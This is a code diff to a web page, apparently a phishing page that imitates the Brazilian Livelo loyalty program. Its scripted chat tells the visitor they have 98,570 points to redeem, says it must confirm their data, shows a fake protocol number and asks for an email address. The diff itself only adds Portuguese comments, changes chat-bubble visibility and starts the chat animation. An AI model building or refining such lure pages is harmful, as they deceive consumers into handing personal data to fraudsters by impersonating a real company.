@@ -340,11 +340,6 @@
             color: white;
             font-size: 1rem;
             line-height: 1.5;
-            display: none;
-        }
-
-        .balao-chat.visible {
-            display: block;
         }
 
         .mensagem-final {
@@ -711,24 +706,31 @@
         async function iniciarAnimacaoChat() {
             console.log('🎬 Iniciando animação do chat (página 3)...');
             
+            // Mostra primeiro balão e digita
             $('#msg1').addClass('visible');
             await typeMessage('msg1-text', 'Você tem 98.570 pontos Livelo disponíveis para resgate.', 50);
             $('#hora1').text(getHora());
             
+            // Aguarda 1 segundo
             await new Promise(resolve => setTimeout(resolve, 1000));
             
+            // Mostra segundo balão e digita
             $('#msg2').addClass('visible');
             await typeMessage('msg2-text', 'Eu vou te ajudar com o seu resgate de pontos, mas primeiro vou precisar confirmar alguns dados.', 50);
             $('#hora2').text(getHora());
             
+            // Aguarda 1 segundo
             await new Promise(resolve => setTimeout(resolve, 1000));
             
+            // Mostra terceiro balão (protocolo) e digita
             $('#msg3').addClass('visible');
             await typeMessage('msg3-text', 'Protocolo: 2026031180153', 50);
             $('#hora3').text(getHora());
             
+            // Aguarda 1 segundo
             await new Promise(resolve => setTimeout(resolve, 1000));
             
+            // Mostra quarto balão e digita
             $('#msg4').addClass('visible');
             await typeMessage('msg4-text', 'Para iniciar seu resgate, digite seu e-mail que vai receber o comprovante:', 50);
             
@@ -886,6 +888,7 @@
                     $('#page2').addClass('hidden');
                     $('#page3').removeClass('hidden');
                     
+                    // Inicia a animação do chat
                     iniciarAnimacaoChat();
                 }, 3000);
             });
